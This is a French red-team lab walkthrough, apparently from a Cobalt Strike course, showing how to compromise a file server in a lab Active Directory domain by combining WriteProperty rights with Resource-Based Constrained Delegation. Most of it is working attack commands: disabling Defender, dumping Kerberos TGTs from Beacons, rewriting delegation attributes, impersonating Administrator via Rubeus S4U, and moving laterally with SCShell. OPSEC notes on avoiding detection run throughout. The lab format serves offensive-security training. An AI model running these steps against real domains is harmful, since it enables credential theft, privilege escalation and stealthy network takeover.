# Lab — Resource-Based Constrained Delegation (RBCD)

>L'objectif de ce lab est de combiner le privilège `WriteProperty` et la **Resource-Based Constrained Delegation (RBCD)** pour compromettre un ordinateur.  

## SOCKS

1. Lancer **Cobalt Strike** et se connecter au **team server**.  
2. Interagir avec le Beacon de `pchilds` et démarrer un **SOCKS proxy**.  
   `socks 1080 socks5`  
3. Depuis le menu Démarrer de Windows, lancer `Profixier`.  
4. L'application s'ouvre dans la barre des tâches : cliquer sur son icône pour afficher la fenêtre.  

### Configurer le Proxy Server  

>Ajouter le team server en tant que nouveau proxy :  
    1. **Profile > Proxy Servers**  
    2. Cliquer sur **Add**.  
    3. Adresse du serveur Cobalt Strike :  `10.0.0.5`  
    4. Port:  `1080`  
    5. Protocol: **SOCKS Version 5**  
    6. Cliquer sur **OK**.  
    
⚠️ Une fenêtre demande si le proxy doit être utilisé par défaut : sélectionner **No**.  

>Cliquer à nouveau sur **OK**.  
    
⚠️ Une nouvelle fenêtre propose de modifier les `Proxification Rules` : sélectionner **Yes**.  

### Configurer les Proxification Rules  

>Créer une règle acheminant le trafic destiné au réseau cible via le team server, quelle que soit l'application ou le port.
    1. Cliquer sur **Add**.
    2. Name:  `Beacon Network Route Rule`
    3. Target hosts:  `10.10.120.0/23`
    4. Action: **Proxy SOCKS5 10.0.0.5**
    5. Cliquer sur **OK**.
    6. Cliquer à nouveau sur **OK**.

<img src="/images/rbcd_lab04.png">

### DNS

1. Ouvrir Windows Terminal **en administrateur**.
2. Ajouter des enregistrements DNS statiques pour `lon-dc-1` et `contoso.com` sur l'Attacker Desktop afin de résoudre les noms avec proxychains.

```PowerShell
Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value "10.10.120.1 lon-dc-1 lon-dc-1.contoso.com contoso.com"
```

### Defender

1. Toujours depuis le terminal administrateur de l'Attacker Desktop, désactiver la protection temps réel Microsoft Defender Antivirus dans ce lab 🛡️  
   `Set-MpPreference -DisableRealtimeMonitoring $true`  

### TGT de l'utilisateur courant

>TGT delegation depuis un Beacon low integrity sous `pchilds`.  
>Récupérer le TGT de l'utilisateur qui exécute le Beacon.  

⚠️ Prérequis : charger le script Aggressor BOF pour `krb_triage` et `krb_dump`.  
>Open > Cobalt Strike > Script Manager > Load > `C:\Tools\Kerbeus-BOF\kerbeus_cs.cna`  

1. Depuis le Beacon medium integrity de `pchilds`, extraire le TGT de l'utilisateur courant.  
    `krb_tgtdeleg`
    
2. Copier le TGT Base64 renvoyé dans le presse-papiers.  

3. Sur l'Attacker Desktop, créer un processus **netonly** ouvrant une nouvelle fenêtre PowerShell.  
    `runas /netonly /user:CONTOSO\pchilds powershell`  

* Saisir un mot de passe fictif.
    
4. Depuis cette nouvelle fenêtre PowerShell, demander un service ticket LDAP via le proxy en utilisant dans `Rubeus` le TGT Base64 obtenu.  

```Terminal-nocolor
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:[TGT] /service:ldap/lon-dc-1 /dc:lon-dc-1 /ptt
```

>Configuration prête.  

===

## Énumération

1. Importer PowerView. Vérifier que la protection temps réel ne bloque pas `PowerView.ps1` dans l'environnement du lab. 🛡️
   `ipmo C:\Tools\PowerSploit\Recon\PowerView.ps1`

2. Identifier les principals disposant de **WriteProperty** sur l'attribut `msDS-AllowedToActOnBehalfOfOtherIdentity` des ordinateurs.

```PowerShell
Get-DomainComputer -Server 'lon-dc-1' | Get-DomainObjectAcl -Server 'lon-dc-1' | ? { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -eq 'WriteProperty' } | select ObjectDN,SecurityIdentifier
```

⚠️ Le lab montre un principal avec un RID se terminant par **1107** et disposant de ce droit sur plusieurs ordinateurs.🔍

3. Interroger LDAP pour déterminer si le SID correspond à un utilisateur, un ordinateur ou un groupe.

```PowerShell
Get-DomainObject -LDAPFilter '(objectSid=S-1-5-21-3926355307-1661546229-813047887-1107)' -Server 'lon-dc-1'
```

⚠️ Le résultat identifie le groupe de domaine « Server Admins », auquel appartient `rsteel`.🔍

<img src="/images/rbcd_lab05.png">  

4. Revenir dans Cobalt Strike et récupérer le TGT de `rsteel` avec le Beacon SYSTEM high integrity.

```
krb_triage
```
    
> ⚠️ LUID `/luid:244f58`. Exécuter d'abord `krb_triage` pour obtenir le LUID actuel de `rsteel` (e.g. `0x1e7efb` in this run).
    
```
krb_dump /luid:<rsteel-LUID-from-krb_triage> /service:krbtgt
```
    
    > OPSEC-🟠CAUTION — BOF, utilise l'API Kerberos `LsaCallAuthenticationPackage`, sans lecture directe de LSASS.
    > ⚠️ Utiliser `/luid:1e7efb` et **non** `/luid:0x1e7efb` — Kerbeus-BOF rejects 0x prefix ("Invalid luid").
    > output base64 ticket = [BASE64_from_krb_dump_luid_TGT_RSTEEL] copy to clipboard  

<img src="/images/rbcd_lab06.png">  

5. Avant d'utiliser le TGT Base64 de `rsteel`, purger le ticket LDAP de `pchilds` depuis le processus netonly de l'Attacker Desktop.

```PowerShell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe purge
```

6. Demander un nouveau service ticket LDAP avec le TGT Base64 de `rsteel`.

```PowerShell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:[BASE64_from_krb_dump_luid_TGT_RSTEEL] /service:ldap/lon-dc-1 /dc:lon-dc-1 /ptt
```

===

## Exploitation RBCD

1. Vérifier les configurations RBCD existantes.

>Depuis l'Attacker Desktop, avec Proxifier actif et PowerView importé, exécuter dans PowerShell :  
```PowerShell
Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount
```

⚠️ LON-FS-1 possède déjà `LON-WS-1` en delegate RBCD. **Ne pas écraser cette entrée** : ajouter la nouvelle à côté (étape 2).

2. Ajouter une configuration RBCD entre `lon-fs-1` et `lon-wkstn-1` sans écraser l'entrée existante.❗

```PowerShell
$ws1 = Get-ADComputer -Identity 'lon-ws-1' -Server 'lon-dc-1'
$wkstn1 = Get-ADComputer -Identity 'lon-wkstn-1' -Server 'lon-dc-1'
Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1,$wkstn1 -Server 'lon-dc-1'
```

> ⚠️ Important : fournir **les deux** `$ws1,$wkstn1` pour conserver l'entrée `LON-WS-1`. Utiliser uniquement `$wkstn1` supprimerait l'entrée `LON-WS-1`. Lab-confirmed result: `LON-FS-1: {LON-WS-1, LON-WKSTN-1}`.

3. Dans PowerShell sur l'Attacker Desktop, vérifier la présence de `lon-ws-1` et `lon-wkstn-1`.
  
```PowerShell
Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount
Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount
```

<img src="/images/rbcd_lab07.png">  

4. Revenir dans le Beacon Cobalt Strike et récupérer le TGT de `lon-wkstn-1` depuis un Beacon SYSTEM high integrity.  

```
krb_dump /luid:3e7 /service:krbtgt
```
    
> base64 Output [krb_dump_output_for_lon-wkstn-1_TGT]
> OPSEC-🟠CAUTION — BOF, Kerberos API. Requires 🔥SYSTEM context. `/luid:3e7` = machine account session — always present on domain-joined host.  
> ⚠️ NO 0x prefix — `/luid:0x3e7` = "Invalid luid" error (Kerbeus-BOF lab-confirmed).  
    
5. Dans PowerShell sur l'Attacker Desktop, copier la sortie Base64 du TGT obtenu.  
>Demander un service ticket pour `cifs/lon-fs-1` en impersonant l'administrateur du domaine.  
  
```PowerShell-nocolor
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-wkstn-1$ /impersonateuser:Administrator /msdsspn:cifs/lon-fs-1 /ticket:[krb_dump_output_for_lon-wkstn-1_TGT] /dc:lon-dc-1 /outfile:C:\Users\Attacker\Desktop\
```

> OPSEC-🟢SAFE — Rubeus s'exécute sur l'Attacker Desktop, et non via le Beacon ; les fichiers sont écrits uniquement en local.  
**D'après le contexte du lab, l'Attacker Desktop n'est pas surveillé par le SOC Blue Team.**  

> ⚠️ Avec un **chemin de dossier** pour `/outfile`, Rubeus nomme automatiquement les fichiers :
> - S4U2self ticket: `_Administrator_to_LON-WKSTN-1$@CONTOSO.COM`
> - S4U2proxy cifs ticket: `_cifs_lon-fs-1`
> 
> Le fichier nécessaire pour `kerberos_ticket_use` est `_cifs_lon-fs-1` (no extension). 
> Reprendre le nom exact fourni dans la sortie Rubeus :
> `[*] Ticket written to C:\Users\Attacker\Desktop\_cifs_lon-fs-1`

6. Utiliser le ticket enregistré sur l'Attacker Desktop pour lister le partage `C$` de `lon-fs-1`.

```cs
// skip make_token (OPSEC-🟢SAFE — no Event 4648, lab-confirmed working)
kerberos_ticket_use C:\Users\Attacker\Desktop\_cifs_lon-fs-1
ls \\lon-fs-1\c$
```

> ⚠️ 🔥 `make_token` **n'est pas nécessaire** and `ls \\lon-fs-1\c$` succeeded. Le serveur distant valide le ticket Kerberos, et non l'identité de la session locale — `kerberos_ticket_use` injecte directement le ticket dans la session de logon du Beacon.

<img src="/images/rbcd_lab08.png">  

```cs
C:\Tools\SCShell\CS-BOF\scshell.cna
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
jump scshell64 lon-fs-1 smb
```  

<img src="/images/rbcd_lab09.png">    

7. Depuis l'Attacker Desktop, restaurer la configuration RBCD d'origine.

```PowerShell
Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1 -Server 'lon-dc-1'
Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount
```

⚠️ Ce lab montre comment exploiter une permission `WriteProperty` en combinaison avec RBCD pour accéder à un ordinateur.
